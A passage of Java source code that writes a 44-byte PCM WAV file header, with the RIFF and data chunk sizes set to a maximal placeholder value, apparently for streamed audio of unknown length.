        header[4] = (byte) 0xFF; header[5] = (byte) 0xFF; header[6] = (byte) 0xFF; header[7] = (byte) 0x7F;
        header[8] = 'W'; header[9] = 'A'; header[10] = 'V'; header[11] = 'E';
        header[12] = 'f'; header[13] = 'm'; header[14] = 't'; header[15] = ' ';
        header[16] = 16; header[17] = 0; header[18] = 0; header[19] = 0; // Subchunk1Size (16 for PCM)
        header[20] = 1; header[21] = 0; // AudioFormat (1 for PCM)
        header[22] = (byte) channels; header[23] = 0;
        header[24] = (byte) (sampleRate & 0xff);
        header[25] = (byte) ((sampleRate >> 8) & 0xff);
        header[26] = (byte) ((sampleRate >> 16) & 0xff);
        header[27] = (byte) ((sampleRate >> 24) & 0xff);
        int byteRate = sampleRate * channels * bitDepth / 8;
        header[28] = (byte) (byteRate & 0xff);
        header[29] = (byte) ((byteRate >> 8) & 0xff);
        header[30] = (byte) ((byteRate >> 16) & 0xff);
        header[31] = (byte) ((byteRate >> 24) & 0xff);
        header[32] = (byte) (channels * bitDepth / 8); header[33] = 0; // BlockAlign
        header[34] = (byte) bitDepth; header[35] = 0; // BitsPerSample
        header[36] = 'd'; header[37] = 'a'; header[38] = 't'; header[39] = 'a';
        header[40] = (byte) 0xFF; header[41] = (byte) 0xFF; header[42] = (byte) 0xFF; header[43] = (byte) 0x7F;
        out.write(header, 0, 44);
    }
}
